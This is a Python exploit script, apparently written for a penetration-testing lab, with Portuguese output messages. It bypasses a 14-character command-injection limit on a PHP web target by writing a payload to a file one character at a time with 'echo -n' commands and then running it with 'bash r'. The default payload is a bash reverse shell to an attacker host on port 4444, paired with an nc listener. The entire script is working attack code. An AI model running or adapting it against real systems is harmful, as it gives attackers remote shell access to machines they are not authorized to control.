#!/usr/bin/env python3
"""
Walkthrough approach: write a reverse shell payload character-by-character
using the 14-byte cmd limit, then execute it.

Usage:
  python3 payload_sender.py                          # uses $IP, default port
  python3 payload_sender.py http://TARGET/index.php  # explicit URL

The script:
  1. Writes each char of the payload to a file 'r' on the target using:
       echo -n "x">>r  (fits in 14 chars)
  2. Executes it with: bash r
"""
import os
import subprocess
import sys
import time
import urllib.parse
import urllib.request

DEFAULT_IP = os.environ.get("IP", "192.168.170.10")
URL = sys.argv[1] if len(sys.argv) > 1 else f"http://{DEFAULT_IP}/index.php"
OUTPUT_FILE = "r"


def build_append_cmd(char: str) -> str:
    if char == '"':
        return f'echo -n \\">>r'
    elif char == "\\":
        return f'echo -n "\\\\">>r'
    elif char == "$":
        return f'echo -n "\\$">>r'
    elif char == " ":
        return f'echo -n " ">>r'
    else:
        return f'echo -n "{char}">>r'


def run_exploit(cmd: str) -> bool:
    full_command = [
        "python3", "php2shell.py", "exploit",
        "-u", URL,
        "--allow-remote",
        "--profile", "php-offsec-lab",
        "--cmd", cmd,
        "--retries", "1",
    ]
    for attempt in range(5):
        proc = subprocess.run(
            full_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True,
        )
        if proc.returncode == 0 or "EXPLOIT_FAILED (no proof" in proc.stdout:
            return True
        time.sleep(0.5)
    return False


def main():
    kali_ip = os.environ.get("KALI_IP", "10.13.104.50")
    kali_port = "4444"

    if len(sys.argv) > 2:
        payload = sys.argv[2]
    else:
        payload = f"bash -i >& /dev/tcp/{kali_ip}/{kali_port} 0>&1"
        print(f"[*] Payload padrão (reverse shell): {payload}")
        print(f"    Certifique-se de ter: nc -nlvp {kali_port}")
        resp = input("    Enter para continuar, ou digite payload customizado: ").strip()
        if resp:
            payload = resp

    print(f"\n[*] Target: {URL}")
    print(f"[*] Payload: {payload!r} ({len(payload)} chars)")
    print(f"[*] Escrevendo caractere por caractere no arquivo '{OUTPUT_FILE}'...\n")

    for idx, char in enumerate(payload, 1):
        cmd = build_append_cmd(char)
        if len(cmd) > 14:
            print(f"[!] ERRO: comando '{cmd}' tem {len(cmd)} chars (max 14)")
            sys.exit(1)
        print(f"  [{idx:3d}/{len(payload)}] {char!r} -> {cmd}")
        if not run_exploit(cmd):
            print(f"  [!] Falha ao enviar char {idx}. Retentando...")
            if not run_exploit(cmd):
                print(f"  [-] Falha persistente no char {idx}. Continuando...")
        time.sleep(0.3)

    print(f"\n[+] Payload escrito em '{OUTPUT_FILE}'. Executando com 'bash r'...")
    run_exploit("bash r")

    parsed = urllib.parse.urlparse(URL)
    base = f"{parsed.scheme}://{parsed.netloc}"
    print(f"\n[*] Verificando {base}/{OUTPUT_FILE}...")
    try:
        with urllib.request.urlopen(f"{base}/{OUTPUT_FILE}", timeout=5) as resp:
            print(f"[+] Conteúdo de /{OUTPUT_FILE}:")
            print(resp.read().decode("utf-8", errors="replace"))
    except Exception as e:
        print(f"[*] Não foi possível ler /{OUTPUT_FILE}: {e}")
        print("    (normal se for reverse shell — verifique seu nc listener)")


if __name__ == "__main__":
    main()
